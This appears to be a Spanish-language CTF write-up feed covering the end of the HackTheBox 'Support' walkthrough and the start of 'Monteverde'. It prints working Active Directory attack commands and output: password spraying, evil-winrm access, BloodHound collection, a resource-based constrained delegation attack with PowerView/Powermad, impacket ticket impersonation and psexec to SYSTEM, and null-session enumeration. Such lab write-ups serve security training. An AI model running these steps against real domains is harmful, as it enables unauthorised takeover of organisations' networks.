➜  content <span class="nb">cat </span>users.txt
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
</code></pre></div></div>

<ul>
  <li>Vamos a ver si podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> con la contraseña que tenemos para ver si le pertenece a otro usuario por que con <code class="language-plaintext highlighter-rouge">rpcclient</code> vimos que es de <code class="language-plaintext highlighter-rouge">support</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.245.29 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'Ironside47pleasure40Watchful'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span>
HTTP        10.129.245.29   5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.245.29:5985/wsman
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\A</span>dministrator:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\G</span>uest:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\k</span>rbtgt:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>dap:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>+] support.htb<span class="se">\s</span>upport:Ironside47pleasure40Watchful <span class="o">(</span>Pwn3d!<span class="o">)</span>
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>mith.rosario:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\h</span>ernandez.stanley:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>ilson.shelby:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\a</span>nderson.damian:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\t</span>homas.raphael:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>evine.leopoldo:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\r</span>aven.clifton:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\b</span>ardot.mary:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\c</span>romwell.gerard:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\m</span>onroe.david:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\w</span>est.laura:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\l</span>angley.lucy:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\d</span>aughtler.mabel:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\s</span>toll.rachelle:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               <span class="o">[</span>-] support.htb<span class="se">\f</span>ord.victoria:Ironside47pleasure40Watchful
</code></pre></div></div>

<ul>
  <li>Nos podemos conectar gracias a que el usuario <strong>support</strong> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> support.htb <span class="nt">-u</span> support <span class="nt">-p</span> Ironside47pleasure40Watchful

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>support<span class="se">\s</span>upport
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
05e7a42ec2aa2d13e6eaee5383b2ed97
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>
    <p>Para enumerar la maquina y poder ver vias potenciales de elevar nuestros privilegios vamos a usar <strong>Bloodhound</strong> <a href="https://www.kali.org/tools/bloodhound/">https://www.kali.org/tools/bloodhound/</a>.</p>
  </li>
  <li>
    <p>Para eso vas a necesitar descargar el <strong>.zip</strong> <a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content unzip SharpHound-v2.3.3.zip
Archive:  SharpHound-v2.3.3.zip
  inflating: SharpHound.exe
  inflating: SharpHound.exe.config
  inflating: SharpHound.pdb
  inflating: SharpHound.ps1
  inflating: System.Console.dll
  inflating: System.Diagnostics.Tracing.dll
  inflating: System.Net.Http.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo subimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/SharpHound.exe

Info: Uploading /home/miguel/Hackthebox/Support/content/SharpHound.exe to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\S</span>harpHound.exe

Data: 1791316 bytes of 1791316 bytes copied

Info: Upload successful!
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpHound.exe <span class="nt">-c</span> All
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el comprimido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Ese <code class="language-plaintext highlighter-rouge">.zip</code> lo vamos a subir a <code class="language-plaintext highlighter-rouge">BloodHound</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; download C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip info.zip

Info: Downloading C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\2</span>0240329132001_BloodHound.zip to info.zip

Info: Download successful!
</code></pre></div></div>

<ul>
  <li>Vemos que hay un grupo que se llama <strong>Shared Support Accounts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; net group

Group Accounts <span class="k">for</span> <span class="se">\\</span>

<span class="nt">-------------------------------------------------------------------------------</span>
<span class="k">*</span>Cloneable Domain Controllers
<span class="k">*</span>DnsUpdateProxy
<span class="k">*</span>Domain Admins
<span class="k">*</span>Domain Computers
<span class="k">*</span>Domain Controllers
<span class="k">*</span>Domain Guests
<span class="k">*</span>Domain Users
<span class="k">*</span>Enterprise Admins
<span class="k">*</span>Enterprise Key Admins
<span class="k">*</span>Enterprise Read-only Domain Controllers
<span class="k">*</span>Group Policy Creator Owners
<span class="k">*</span>Key Admins
<span class="k">*</span>Protected Users
<span class="k">*</span>Read-only Domain Controllers
<span class="k">*</span>Schema Admins
<span class="k">*</span>Shared Support Accounts
The <span class="nb">command </span>completed with one or more errors.
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos ver eso en <strong>Bloodhound</strong>.</p>
  </li>
  <li>
    <p>El grupo <code class="language-plaintext highlighter-rouge">SHARED SUPPORT ACCOUNTS</code> tiene <code class="language-plaintext highlighter-rouge">GenericAll</code> en el <code class="language-plaintext highlighter-rouge">DC</code> .</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/priv.png" />
</p>

<h1 id="resource-based-constrained-delegation-attack">Resource based constrained delegation attack</h1>

<ul>
  <li>
    <p>En este post nos explican como funciona todo <a href="https://github.com/tothi/rbcd-attack">https://github.com/tothi/rbcd-attack</a>, <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation</a>.</p>
  </li>
  <li>
    <p>Para explotar esto necesitaremos de lo siguiente <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>, <a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1">https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1</a>.</p>
  </li>
  <li>
    <p>Ahora lo subimos ala maquina y lo importamos para que lo interprete.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/PowerView.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments


Mode                 LastWriteTime         Length Name
<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
<span class="nt">-a----</span>         3/29/2024   2:34 PM         770279 PowerView.ps1
<span class="nt">-a----</span>         3/29/2024   1:18 PM        1343488 SharpHound.exe
<span class="nt">-a----</span>         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owerView.ps1
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; upload /home/miguel/Hackthebox/Support/content/Powermad.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/Powermad.ps1 to C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments<span class="se">\P</span>owermad.ps1

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\P</span>owermad.ps1
</code></pre></div></div>

<ul>
  <li>Vamos a comenzar creando un <strong>Computer object</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; New-MachineAccount <span class="nt">-MachineAccount</span> Nuevo <span class="nt">-Password</span> <span class="si">$(</span>ConvertTo-SecureString <span class="s1">'123456'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="si">)</span> <span class="nt">-Verbose</span>
Verbose: <span class="o">[</span>+] Domain Controller <span class="o">=</span> dc.support.htb
Verbose: <span class="o">[</span>+] Domain <span class="o">=</span> support.htb
Verbose: <span class="o">[</span>+] SAMAccountName <span class="o">=</span> Nuevo<span class="err">$</span>
Verbose: <span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
<span class="o">[</span>+] Machine account Nuevo added
</code></pre></div></div>

<ul>
  <li>Comprobamos que exista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer Nuevo


pwdlastset             : 3/29/2024 2:39:18 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : <span class="nv">CN</span><span class="o">=</span>Nuevo,CN<span class="o">=</span>Computers,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
objectclass            : <span class="o">{</span>top, person, organizationalPerson, user...<span class="o">}</span>
name                   : Nuevo
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
samaccountname         : Nuevo<span class="err">$</span>
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/29/2024 9:39:18 PM
instancetype           : 4
usncreated             : 90263
objectguid             : df9abf14-106b-4628-af15-0893a1ecf055
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : <span class="nv">CN</span><span class="o">=</span>Computer,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>support,DC<span class="o">=</span>htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : <span class="o">{</span>RestrictedKrbHost/Nuevo, HOST/Nuevo, RestrictedKrbHost/Nuevo.support.htb, HOST/Nuevo.support.htb<span class="o">}</span>
ms-ds-creatorsid       : <span class="o">{</span>1, 5, 0, 0...<span class="o">}</span>
badpwdcount            : 0
cn                     : Nuevo
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 3/29/2024 9:39:18 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90265
dnshostname            : Nuevo.support.htb
</code></pre></div></div>

<ul>
  <li>Vamos a seguir con los pasos que nos dan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$ComputerSid</span> <span class="o">=</span> Get-DomainComputer Nuevo <span class="nt">-Properties</span> objectsid | Select <span class="nt">-Expand</span> objectsid
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="si">$(</span><span class="nv">$ComputerSid</span><span class="si">)</span><span class="s2">)"</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; <span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>upport<span class="se">\D</span>ocuments&gt; Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora usaremos impacket para obtener un ticket suplantando al Administrator.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getST <span class="nt">-spn</span> cifs/dc.support.htb <span class="nt">-impersonate</span> Administrator <span class="nt">-dc-ip</span> 10.129.245.29 support.htb/Nuevo<span class="nv">$:</span>123456
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno con el nombre del ticket.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar y leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec <span class="nt">-k</span> dc.support.htb
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file GoDYfrro.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service tmuw on dc.support.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service tmuw.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.20348.859]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
7088702023ddab61e77faaf6ac6fcbc2
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Monteverde (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html" rel="alternate" type="text/html" title="HackTheBox - Monteverde (medium)" /><published>2024-04-10T00:00:00-06:00</published><updated>2024-04-10T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/10/monterverde.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/00ceebe5dbef1106ce4390365cd787b4.png" />
</p>

<p>En este post vamos a estar haciendo la maquina Monteverde de la plataforma de Hack The Box donde mediante el protocolo RPC vamos a estar enumerando usuarios del dominio y gracias a que un usuario usa su nombre como contraseña vamos a poder conectarnos al servicio smb y leer una contraseña en texto plano después haremos un password spray para darnos cuenta a que usuario le pertenece la contraseña y conectarnos con evil-winrm para la escalada de privilegios abusaremos de que estamos en grupo Azure Admins Group.</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y los servicios que corre la maquina por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3269,5985,9389,49667,49673,49674,49676,49697 10.129.228.111 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 12:45 CST
Nmap scan report <span class="k">for </span>10.129.228.111
Host is up <span class="o">(</span>0.089s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-31 18:45:34Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-03-31T18:46:24
|_  start_date: N/A
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Estamos ante un <strong>Windows 10</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.228.111
SMB         10.129.228.111  445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar el nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.129.228.111 MEGABANK.LOCAL"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.228.111 MEGABANK.LOCAL
</code></pre></div></div>

<ul>
  <li>Vemos que la maquina tiene el servicio <strong>RPC</strong> así que podemos usar la herramienta <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar este servicio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
</code></pre></div></div>

<ul>
  <li>Como podemos enumerar usuarios del dominio vamos añadirlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111 <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[\D*?\]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
➜  content <span class="nb">cat </span>users.txt
Guest
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
</code></pre></div></div>

<ul>
  <li>Como tenemos una lista de usuarios podemos probar con un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers MEGABANK.LOCAL/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno como tal el ataque fallo y ningún usuario tiene configurado el UF_DONT_REQUIRE_PREAUTH <a href="https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23">https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23</a>.</p>
  </li>
  <li>
    <p>Bueno nos volveremos a conectar con <code class="language-plaintext highlighter-rouge">rpcclient</code> para enumerar mas usando el servicio.</p>
  </li>
  <li>
    <p>Estos son los grupos del dominio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.228.111
rpcclient <span class="nv">$&gt;</span> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
</code></pre></div></div>

<ul>
  <li>Pero bueno poca cosa vamos a poder hacer.</li>
</ul>

